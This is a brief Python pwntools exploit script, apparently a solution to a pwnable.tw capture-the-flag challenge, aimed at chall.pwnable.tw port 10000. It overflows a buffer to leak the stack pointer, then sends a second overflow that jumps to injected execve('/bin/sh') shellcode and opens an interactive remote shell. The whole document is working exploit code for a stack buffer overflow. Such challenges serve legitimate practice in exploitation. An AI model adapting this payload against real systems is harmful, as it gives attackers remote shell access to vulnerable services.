from pwn import *

fd = remote("chall.pwnable.tw", 10000)
pause()

context(arch='i386', os='linux')

leakesp = 0x08048087
addesp = 0x08048099


binsh = "/bin/sh"

shellcode = ''
shellcode += shellcraft.execve(binsh, 0, 0)

fd.recv()
payload = "A"*0x14 + p32(leakesp)
fd.send(payload)

esp = u32(fd.recv(4))

payload = "A" *0x14 + p32(esp+0x14)
payload += asm(shellcode) 

fd.send(payload)
fd.interactive()
